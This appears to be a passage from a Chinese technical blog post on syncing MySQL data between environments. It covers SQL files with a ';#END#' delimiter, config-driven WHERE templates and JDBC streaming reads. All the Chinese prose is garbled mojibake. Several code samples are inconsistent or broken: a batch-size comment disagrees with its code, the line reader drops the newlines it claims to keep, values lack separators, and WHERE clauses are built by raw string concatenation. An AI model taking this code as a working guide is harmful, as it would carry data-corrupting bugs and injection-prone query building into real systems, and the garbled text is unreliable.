<p>è¿™é‡Œç”¨åˆ°JDBCç¼–ç¨‹ï¼Œé€‚åˆå½“å‰ä¸šåŠ¡éœ€æ±‚ï¼ˆå¤æ³•ç¼–ç¨‹ï¼Œä¸å¾—å·²è€Œä¸ºä¹‹ï¼‰</p>
</blockquote>
<h3 data-id="heading-10">ç”Ÿæˆå®Œæ•´SQLæ–‡ä»¶</h3>
<p>æ‹¿åˆ°è¡¨ç»“æ„åï¼Œç”Ÿæˆæ ‡å‡†SQLæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å…ˆåˆ é™¤ç›®æ ‡ç¯å¢ƒçš„æ—§æ•°æ®ï¼ˆä¿è¯å¹‚ç­‰æ€§ï¼‰</span>
<span class="hljs-type">String</span> <span class="hljs-variable">deleteStatement</span> <span class="hljs-operator">=</span> <span class="hljs-string">"DELETE FROM `user_info` WHERE shop_id = 12345;\n"</span>;

<span class="hljs-comment">// 2. æ‰¹é‡æ’å…¥æ–°æ•°æ®(æ¯æ‰¹1000æ¡)</span>
<span class="hljs-type">String</span> <span class="hljs-variable">insertStatement</span> <span class="hljs-operator">=</span> 
    <span class="hljs-string">"INSERT INTO `user_info` (`id`, `username`, `create_time`) VALUES\n"</span> +
    <span class="hljs-string">"(1, 'Alice', '2025-01-01 12:00:00'),\n"</span> +
    <span class="hljs-string">"(2, 'Bob', '2025-01-02 13:00:00');\n"</span>;
</code></pre>
<p>ä¸Šä¼ åˆ°OSSåï¼Œå¡”å†…ç›´æ¥é€è¡Œè¯»å–æ‰§è¡Œï¼Œå®Œç¾ï¼</p>
<hr/>
<h2 data-id="heading-11">ç¬¬äºŒéš¾ï¼šæ•°æ®é‡Œæœ‰åˆ†å·ï¼ŒSQLä¼šè¢«åˆ‡å‰²ç‚¸æ‰ï¼</h2>
<h3 data-id="heading-12">é—®é¢˜ç°åœº</h3>
<p>é»˜è®¤SQLè¯­å¥ä»¥<code>;</code>ç»“å°¾ï¼Œä½†æ•°æ®å†…å®¹å¯èƒ½åŒ…å«å„ç§ç‰¹æ®Šæƒ…å†µï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æƒ…å†µ1: æ•°æ®ä¸­åŒ…å«åˆ†å·</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `content` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'æ•™ç¨‹:Java;Spring;MyBatis'</span>);

<span class="hljs-comment">-- æƒ…å†µ2: æ•°æ®ä»¥åˆ†å·ç»“å°¾</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `config` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'path=/usr/local/bin;'</span>);

<span class="hljs-comment">-- æƒ…å†µ3: æ•°æ®ä¸­æœ‰æ¢è¡Œç¬¦,ä¸”ä»¥;ç»“å°¾</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `article` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">'ç¬¬ä¸€è¡Œ
ç¬¬äºŒè¡Œ;
ç¬¬ä¸‰è¡Œ'</span>);
</code></pre>
<p>å¡”å†…å¦‚æœç”¨<code>;</code>åˆ¤æ–­SQLç»“æŸï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> reader.readLine();  
<span class="hljs-comment">// åªè¯»åˆ°: INSERT INTO `content` VALUES (1, 'æ•™ç¨‹:Java</span>
<span class="hljs-comment">// æ•°æ®è¢«æˆªæ–­äº†ï¼</span>
</code></pre>
<p>å¯¼è‡´SQLåˆ‡å‰²é”™ä½ã€è¯­æ³•æŠ¥é”™ã€‚</p>
<h3 data-id="heading-13">è§£å†³æ–¹æ¡ˆï¼šç‰¹æ®Šç¬¦å·æ ‡è®° + é€è¡Œè¯»å–</h3>
<p><strong>æ ¸å¿ƒæ€è·¯</strong>ï¼šæ¯æ¡SQLç‹¬å ä¸€è¡Œï¼Œç”¨ç‰¹æ®Šç¬¦å·<code>;#END#</code>æ ‡è®°ç»“æŸ</p>
<p><strong>å¡”å¤–ç”ŸæˆSQLæ—¶</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…³é”®ï¼šä½¿ç”¨ç‰¹æ®Šç¬¦å·ä½œä¸ºSQLç»“æŸæ ‡è®°</span>
<span class="hljs-type">String</span> <span class="hljs-variable">SPECIAL_DELIMITER</span> <span class="hljs-operator">=</span> <span class="hljs-string">";#END#"</span>;

<span class="hljs-comment">// æ„é€ SQLï¼ˆæ•°æ®å†…å®¹é‡Œçš„åˆ†å·ã€æ¢è¡Œç¬¦éƒ½ä¸å¤„ç†ï¼‰</span>
<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"INSERT INTO `content` VALUES (1, 'Java;Spring')"</span>;  

<span class="hljs-comment">// å†™å…¥æ–‡ä»¶ï¼šæ¯æ¡SQLç‹¬å ä¸€è¡Œï¼Œä»¥ç‰¹æ®Šç¬¦å·ç»“å°¾</span>
writer.write(sql + SPECIAL_DELIMITER);
writer.write(System.lineSeparator());  <span class="hljs-comment">// ç³»ç»Ÿæ¢è¡Œç¬¦</span>
</code></pre>
<p>ä¸Šä¼ åˆ°OSSçš„æ–‡ä»¶å†…å®¹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `content` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'Java;Spring'</span>);#<span class="hljs-keyword">END</span>#
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `config` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'path=/usr/bin;'</span>);#<span class="hljs-keyword">END</span>#
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `article` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">'ç¬¬ä¸€è¡Œ\nç¬¬äºŒè¡Œ'</span>);#<span class="hljs-keyword">END</span>#
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼š</p>
<ul>
<li>æ¯æ¡SQLç‹¬å ä¸€è¡Œï¼ˆä»¥<code>System.lineSeparator()</code>æ¢è¡Œï¼‰</li>
<li>æ¯æ¡SQLä»¥<code>;#END#</code>ç»“å°¾ï¼ˆå®Œæ•´çš„SQLç»“æŸæ ‡è®°ï¼‰</li>
<li>æ•°æ®å†…å®¹é‡Œçš„åˆ†å·<code>;</code>ã€æ¢è¡Œç¬¦<code>\n</code>ç­‰éƒ½ä¿æŒåŸæ ·</li>
</ul>
<p><strong>å¡”å†…æ‰§è¡Œå‰è¿˜åŸ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(
         <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(ossStream))) {
    
    List&lt;String&gt; sqlBatch = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentSql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
    String line;
    
    <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// æ‹¼æ¥å½“å‰è¡Œ</span>
        currentSql.append(line);
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯å®Œæ•´çš„SQLï¼ˆä»¥;#END#ç»“å°¾ï¼‰</span>
        <span class="hljs-keyword">if</span> (currentSql.toString().endsWith(<span class="hljs-string">";#END#"</span>)) {
            <span class="hljs-comment">// è¿˜åŸï¼šç‰¹æ®Šç¬¦å· â†’ æ­£å¸¸åˆ†å·</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">realSql</span> <span class="hljs-operator">=</span> currentSql.toString().replace(<span class="hljs-string">";#END#"</span>, <span class="hljs-string">";"</span>);
            
            <span class="hljs-comment">// æ·»åŠ åˆ°æ‰¹æ¬¡</span>
            sqlBatch.add(realSql);
            currentSql.setLength(<span class="hljs-number">0</span>);  <span class="hljs-comment">// æ¸…ç©ºï¼Œå‡†å¤‡ä¸‹ä¸€æ¡SQL</span>
            
            <span class="hljs-comment">// æ‰¹é‡æ‰§è¡Œï¼ˆæ¯500æ¡ä¸€æ‰¹ï¼‰</span>
            <span class="hljs-keyword">if</span> (sqlBatch.size() &gt;= <span class="hljs-number">100</span>) {
                executeBatch(stmt, sqlBatch);
                sqlBatch.clear();
            }
        }
    }
    
    <span class="hljs-comment">// æ‰§è¡Œå‰©ä½™SQL</span>
    <span class="hljs-keyword">if</span> (!sqlBatch.isEmpty()) {
        executeBatch(stmt, sqlBatch);
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé€‰<code>;#END#</code>ï¼Ÿ</strong></p>
<ul>
<li>è¶³å¤Ÿé•¿ï¼Œä¸ä¼šå’Œæ•°æ®å†…å®¹å†²çªï¼ˆå®æµ‹å‡ åƒä¸‡æ¡æ•°æ®ä»æœªå†²çªï¼‰</li>
<li>æ ‡è®°æ˜ç¡®ï¼Œæ˜“äºç†è§£</li>
<li>å¡”å†…å¤„ç†ç®€å•ï¼Œä¸€è¡Œä»£ç æå®š</li>
</ul>
<h3 data-id="heading-14">å…³é”®ç‚¹ï¼šä¸ºä»€ä¹ˆå¡”å†…è¦é€è¡Œè¯»å–ï¼Ÿ</h3>
<p><strong>åŸå› ä¸€ï¼šSQLæ–‡ä»¶å¯èƒ½å¾ˆå¤§</strong></p>
<p>å•ä¸ªSQLæ–‡ä»¶å¯èƒ½è¾¾åˆ°å‡ ç™¾MBï¼ˆå¦‚50ä¸‡è¡Œæ•°æ®ï¼‰ï¼Œå¦‚æœä¸€æ¬¡æ€§è¯»å–ï¼š</p>
<ul>
<li>å†…å­˜å ç”¨è¿‡é«˜ï¼š100MBæ–‡ä»¶åŠ è½½éœ€è¦å‡ ç™¾MB+å†…å­˜ï¼Œè€Œä¸”å¤šçº¿ç¨‹å¤„ç†æ›´å®¹æ˜“é€ æˆOOM</li>
<li>GCå‹åŠ›å¤§ï¼šå¤§å¯¹è±¡é¢‘ç¹åˆ›å»ºå’Œå›æ”¶</li>
</ul>
<p><strong>åŸå› äºŒï¼šæ— æ³•æŒ‰æ™®é€šåˆ†å·åˆ‡å‰²</strong></p>
<p>å¦‚æœç”¨<code>;</code>åˆ‡å‰²ä¼šå‡ºé”™ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯åšæ³•</span>
String[] sqls = allContent.split(<span class="hljs-string">";"</span>);  <span class="hljs-comment">// ä¼šè¯¯åˆ‡æ•°æ®é‡Œçš„åˆ†å·ï¼</span>
</code></pre>
<p><strong>æ­£ç¡®åšæ³•ï¼šé€è¡Œæ‹¼æ¥ï¼Œé‡åˆ°<code>;#END#</code>æ‰ç®—å®Œæ•´</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•</span>
<span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentSql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
<span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
    currentSql.append(line);
    
    <span class="hljs-keyword">if</span> (currentSql.toString().endsWith(<span class="hljs-string">";#END#"</span>)) {
        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> currentSql.toString().replace(<span class="hljs-string">";#END#"</span>, <span class="hljs-string">";"</span>);
        executeBatch(sql);
        currentSql.setLength(<span class="hljs-number">0</span>);  <span class="hljs-comment">// æ¸…ç©ºï¼Œå‡†å¤‡ä¸‹ä¸€æ¡</span>
    }
}
</code></pre>
<p><strong>SQLæ–‡ä»¶æ ¼å¼ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">table</span>` <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;#<span class="hljs-keyword">END</span>#
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">table</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'data;with;semicolons'</span>);#<span class="hljs-keyword">END</span>#
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `<span class="hljs-keyword">table</span>` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'line1\nline2'</span>);#<span class="hljs-keyword">END</span>#
</code></pre>
<hr/>
<h2 data-id="heading-15">ç¬¬ä¸‰éš¾ï¼šåŒæ­¥ç­–ç•¥å¤šæ ·åŒ–ï¼Œæ€ä¹ˆçµæ´»é…ç½®ï¼Ÿ</h2>
<h3 data-id="heading-16">èƒŒæ™¯ï¼šå››ç§åŒæ­¥ç­–ç•¥</h3>



































<table><thead><tr><th>åŒæ­¥ç­–ç•¥</th><th>é€‚ç”¨åœºæ™¯</th><th>SQLæ“ä½œ</th><th>æ•°æ®èŒƒå›´</th></tr></thead><tbody><tr><td><strong>å…¨è¡¨åŒæ­¥</strong></td><td>åŸºç¡€é…ç½®è¡¨ï¼ˆæ•°æ®é‡å°ï¼Œåƒè¡Œçº§ï¼‰</td><td><code>TRUNCATE</code> + <code>INSERT</code></td><td>æ•´å¼ è¡¨çš„æ‰€æœ‰æ•°æ®</td></tr><tr><td><strong>å…¬å¸çº§æ¡ä»¶åŒæ­¥</strong></td><td>æŒ‰å…¬å¸ç»´åº¦ç®¡ç†çš„è¡¨</td><td><code>DELETE WHERE company_id=?</code> + <code>INSERT</code></td><td>å•ä¸ªå…¬å¸çš„æ‰€æœ‰æ•°æ®</td></tr><tr><td><strong>åº—é“ºçº§å¢é‡åŒæ­¥</strong></td><td>æœ‰è½¯åˆ é™¤æ ‡è®°å’Œæ›´æ–°æ—¶é—´çš„è¡¨</td><td><code>DELETE WHERE shop_id=? AND ...</code> + <code>INSERT</code></td><td>å•åº—é“ºå¢é‡æ•°æ®</td></tr><tr><td><strong>åº—é“ºçº§å…¨é‡åŒæ­¥</strong></td><td>ç‰©ç†åˆ é™¤çš„è¡¨</td><td><code>DELETE WHERE shop_id=?</code> + <code>INSERT</code></td><td>å•åº—é“ºå…¨éƒ¨æ•°æ®</td></tr></tbody></table>
<p><strong>é—®é¢˜</strong>ï¼š100+å¼ è¡¨é‡Œï¼Œ<strong>å››ç§ç­–ç•¥æ··æ‚</strong>ï¼ŒæŸ¥è¯¢æ¡ä»¶å„ä¸ç›¸åŒã€‚éœ€è¦<strong>çµæ´»é…ç½®</strong>æ¯å¼ è¡¨çš„åŒæ­¥ç­–ç•¥å’ŒWHEREæ¡ä»¶ã€‚</p>
<h3 data-id="heading-17">è§£å†³æ–¹æ¡ˆï¼šé…ç½®é©±åŠ¨ + å ä½ç¬¦</h3>
<blockquote>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šæŠŠåŒæ­¥ç­–ç•¥ã€æŸ¥è¯¢æ¡ä»¶æ”¾åˆ°é…ç½®è¡¨é‡Œï¼Œæ¯å¼ è¡¨å•ç‹¬é…ç½®</p>
</blockquote>
<h4 data-id="heading-18">é…ç½®è¡¨è®¾è®¡</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `sync_config` (
    `id` <span class="hljs-type">int</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    `table_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>),
    `table_level` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>),     <span class="hljs-comment">-- company/shop</span>
    `sync_type` <span class="hljs-type">int</span>,                <span class="hljs-comment">-- 0:å…¨è¡¨, 1:æ¡ä»¶åŒæ­¥</span>
    `where_condition` text,         <span class="hljs-comment">-- WHEREæ¡ä»¶æ¨¡æ¿ï¼ˆæ”¯æŒå ä½ç¬¦ï¼‰</span>
    `delete_strategy` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>)   <span class="hljs-comment">-- TRUNCATE/DELETE</span>
);
</code></pre>
<h4 data-id="heading-19">é…ç½®ç¤ºä¾‹</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å…¨è¡¨åŒæ­¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> sync_config <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'sys_config'</span>, <span class="hljs-string">'company'</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-string">'TRUNCATE'</span>);

<span class="hljs-comment">-- å…¬å¸çº§æ¡ä»¶åŒæ­¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> sync_config <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">'company_settings'</span>, <span class="hljs-string">'company'</span>, <span class="hljs-number">1</span>, 
    <span class="hljs-string">'company_id = {companyId} AND status = 1'</span>, <span class="hljs-string">'DELETE'</span>);

<span class="hljs-comment">-- åº—é“ºçº§å¢é‡åŒæ­¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> sync_config <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">'user_table'</span>, <span class="hljs-string">'shop'</span>, <span class="hljs-number">1</span>, 
    <span class="hljs-string">'shop_id = {shopId} AND update_time &gt; {lastTime}'</span>, <span class="hljs-string">'DELETE'</span>);

<span class="hljs-comment">-- åº—é“ºçº§å…¨é‡åŒæ­¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> sync_config <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">4</span>, <span class="hljs-string">'order_table'</span>, <span class="hljs-string">'shop'</span>, <span class="hljs-number">1</span>, 
    <span class="hljs-string">'shop_id = {shopId}'</span>, <span class="hljs-string">'DELETE'</span>);
</code></pre>
<h4 data-id="heading-20">å ä½ç¬¦æ›¿æ¢é€»è¾‘</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">buildWhereCondition</span><span class="hljs-params">(String template, SyncContext ctx)</span> {
    <span class="hljs-keyword">if</span> (template == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;  <span class="hljs-comment">// å…¨è¡¨åŒæ­¥ï¼Œæ— WHEREæ¡ä»¶</span>
    
    <span class="hljs-keyword">return</span> template
        .replace(<span class="hljs-string">"{shopId}"</span>, String.valueOf(ctx.getShopId()))
        .replace(<span class="hljs-string">"{companyId}"</span>, String.valueOf(ctx.getCompanyId()))
        .replace(<span class="hljs-string">"{lastTime}"</span>, ctx.getLastSyncTime());
}
</code></pre>
<h3 data-id="heading-21">SQLç”Ÿæˆè¿‡ç¨‹ï¼ˆä»¥åº—é“ºçº§å¢é‡åŒæ­¥ä¸ºä¾‹ï¼‰</h3>
<h4 data-id="heading-22">æ­¥éª¤1ï¼šæ„é€ æŸ¥è¯¢SQL</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å ä½ç¬¦æ›¿æ¢åå¾—åˆ°WHEREæ¡ä»¶</span>
<span class="hljs-type">String</span> <span class="hljs-variable">whereCondition</span> <span class="hljs-operator">=</span> <span class="hljs-string">"shop_id = 123 AND update_time &gt; '2025-01-15 00:00:00'"</span>;

<span class="hljs-comment">// æ„é€ SELECTè¯­å¥</span>
<span class="hljs-type">String</span> <span class="hljs-variable">selectSql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT * FROM user_table WHERE "</span> + whereCondition;
</code></pre>
<h4 data-id="heading-23">æ­¥éª¤2ï¼šæµå¼è¯»å–å¹¶ç”ŸæˆSQLæ–‡ä»¶</h4>
<p><strong>å…³é”®ç‚¹ï¼šä»ResultSetå…ƒæ•°æ®åŠ¨æ€è·å–å­—æ®µ</strong>ï¼Œè€Œéå†™æ­»å­—æ®µå</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> (<span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(selectSql)) {
    <span class="hljs-type">ResultSetMetaData</span> <span class="hljs-variable">metadata</span> <span class="hljs-operator">=</span> rs.getMetaData();
    <span class="hljs-type">int</span> <span class="hljs-variable">columnCount</span> <span class="hljs-operator">=</span> metadata.getColumnCount();
    
    <span class="hljs-comment">// ä»å…ƒæ•°æ®è·å–åˆ—ååˆ—è¡¨</span>
    List&lt;String&gt; columnNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= columnCount; i++) {
        columnNames.add(metadata.getColumnName(i));
    }
    
    <span class="hljs-comment">// 1. å…ˆå†™DELETEè¯­å¥</span>
    writer.write(<span class="hljs-string">"DELETE FROM user_table WHERE "</span> + whereCondition + <span class="hljs-string">";#END#"</span>);
    writer.write(System.lineSeparator());
    
    <span class="hljs-comment">// 2. æ„é€ INSERTè¯­å¥å¤´éƒ¨ï¼ˆå­—æ®µåä»å…ƒæ•°æ®è·å–ï¼‰</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">insertHeader</span> <span class="hljs-operator">=</span> <span class="hljs-string">"INSERT INTO `user_table` ("</span> + 
        String.join(<span class="hljs-string">", "</span>, columnNames) + <span class="hljs-string">") VALUES\n"</span>;
    
    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">values</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
    <span class="hljs-type">int</span> <span class="hljs-variable">batchCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 3. æµå¼è¯»å–æ•°æ®å¹¶æ‹¼æ¥VALUES</span>
    <span class="hljs-keyword">while</span> (rs.next()) {
        values.append(<span class="hljs-string">"("</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= columnCount; i++) {
            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">1</span>) values.append(<span class="hljs-string">", "</span>);
            <span class="hljs-comment">// æ ¹æ®å­—æ®µç±»å‹æ ¼å¼åŒ–å€¼ï¼ˆåŠ¨æ€å¤„ç†ï¼‰</span>
            values.append(formatValue(rs, i, metadata.getColumnType(i)));
        }
        values.append(<span class="hljs-string">")"</span>);
        batchCount++;
        
        <span class="hljs-comment">// æ¯10è¡Œç”Ÿæˆä¸€æ¡INSERT</span>
        <span class="hljs-keyword">if</span> (batchCount &gt;= <span class="hljs-number">10</span>) {
            writer.write(insertHeader + values.toString() + <span class="hljs-string">";#END#"</span>);
            writer.write(System.lineSeparator());
            values.setLength(<span class="hljs-number">0</span>);
            batchCount = <span class="hljs-number">0</span>;
        } <span class="hljs-keyword">else</span> {
            values.append(<span class="hljs-string">", "</span>);
        }
    }
    
    <span class="hljs-comment">// 4. å¤„ç†å‰©ä½™æ•°æ®</span>
    <span class="hljs-keyword">if</span> (batchCount &gt; <span class="hljs-number">0</span>) {
        writer.write(insertHeader + values.toString() + <span class="hljs-string">";#END#"</span>);
    }
}
</code></pre>
<h4 data-id="heading-24">æœ€ç»ˆç”Ÿæˆçš„SQLæ–‡ä»¶</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> user_table <span class="hljs-keyword">WHERE</span> shop_id <span class="hljs-operator">=</span> <span class="hljs-number">123</span> <span class="hljs-keyword">AND</span> update_time <span class="hljs-operator">&gt;</span> <span class="hljs-string">'2025-01-15 00:00:00'</span>;#<span class="hljs-keyword">END</span>#
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `user_table` (id, shop_id, username, update_time) <span class="hljs-keyword">VALUES</span>
(<span class="hljs-number">1</span>, <span class="hljs-number">123</span>, <span class="hljs-string">'Alice'</span>, <span class="hljs-string">'2025-01-16 10:00:00'</span>),
(<span class="hljs-number">2</span>, <span class="hljs-number">123</span>, <span class="hljs-string">'Bob'</span>, <span class="hljs-string">'2025-01-16 11:00:00'</span>);#<span class="hljs-keyword">END</span>#
</code></pre>
<h3 data-id="heading-25">ä¼˜åŠ¿æ€»ç»“</h3>
<p>âœ… <strong>çµæ´»æ€§</strong>ï¼šå››ç§ç­–ç•¥è‡ªç”±é…ç½®ï¼Œæ»¡è¶³ä¸åŒè¡¨çš„éœ€æ±‚<br/>
âœ… <strong>å¯æ‰©å±•</strong>ï¼šæ–°å¢è¡¨åªéœ€åŠ é…ç½®ï¼Œä»£ç é›¶æ”¹åŠ¨<br/>
âœ… <strong>å ä½ç¬¦</strong>ï¼šæ”¯æŒ<code>{shopId}</code>ã€<code>{companyId}</code>ã€<code>{lastTime}</code>ç­‰åŠ¨æ€å‚æ•°<br/>
âœ… <strong>é›¶ç¡¬ç¼–ç </strong>ï¼šå­—æ®µåä»å…ƒæ•°æ®åŠ¨æ€è·å–ï¼Œé€‚é…ä»»æ„è¡¨ç»“æ„</p>
<hr/>
<h2 data-id="heading-26">ç¬¬å››éš¾ï¼šå•è¡¨50W+æ•°æ®ï¼Œå¦‚ä½•é˜²æ­¢OOMï¼Ÿ</h2>
<h3 data-id="heading-27">é—®é¢˜ï¼šä¼ ç»Ÿæ–¹å¼çš„å†…å­˜æ€æ‰‹</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åé¢æ•™æï¼šä¸€æ¬¡æ€§åŠ è½½å…¨éƒ¨æ•°æ®</span>
<span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT * FROM huge_table WHERE shop_id = 123"</span>;
List&lt;Map&lt;String, Object&gt;&gt; allRows = jdbcTemplate.queryForList(sql);  <span class="hljs-comment">// ç›´æ¥OOM</span>
</code></pre>
<p><strong>å•åº—é“ºå•è¡¨å¯èƒ½50W+è¡Œ</strong>ï¼Œå…¨éƒ¨åŠ è½½åˆ°å†…å­˜ä¼šå¯¼è‡´OutOfMemoryErrorã€‚</p>
<h3 data-id="heading-28">è§£å†³æ–¹æ¡ˆï¼šæµå¼è¯»å– + ä¸´æ—¶æ–‡ä»¶</h3>
<h4 data-id="heading-29">MySQLæµå¼è¯»å–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generateSQL</span><span class="hljs-params">(DataSource ds, String sql)</span> <span class="hljs-keyword">throws</span> SQLException {
    <span class="hljs-keyword">try</span> (<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> ds.getConnection();
         <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement(
             ResultSet.TYPE_FORWARD_ONLY,    <span class="hljs-comment">// åªå‘å‰éå†</span>
             ResultSet.CONCUR_READ_ONLY)) {  <span class="hljs-comment">// åªè¯»æ¨¡å¼</span>
        
        <span class="hljs-comment">// æ ¸å¿ƒï¼šå¯ç”¨MySQLæµå¼è¯»å–</span>
        stmt.setFetchSize(Integer.MIN_VALUE);  <span class="hljs-comment">// MySQL JDBCç‰¹æ®Šçº¦å®šï¼</span>
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql)) {
            <span class="hljs-type">int</span> <span class="hljs-variable">batchCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sqlValues</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
            
            <span class="hljs-keyword">while</span> (rs.next()) {  <span class="hljs-comment">// é€è¡Œå¤„ç†</span>
                sqlValues.append(<span class="hljs-string">"("</span>);
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= columnCount; i++) {
                    sqlValues.append(formatValue(rs, i));
                }
                sqlValues.append(<span class="hljs-string">")"</span>);
                batchCount++;
                
                <span class="hljs-comment">// æ¯10è¡Œç”Ÿæˆä¸€æ¡INSERT</span>
                <span class="hljs-keyword">if</span> (batchCount &gt;= <span class="hljs-number">10</span>) {
                    writeInsert(sqlValues.toString());
                    sqlValues.setLength(<span class="hljs-number">0</span>);  <span class="hljs-comment">// æ¸…ç©ºç¼“å†²</span>
                    batchCount = <span class="hljs-number">0</span>;
                }
            }
        }
    }
}
</code></pre>
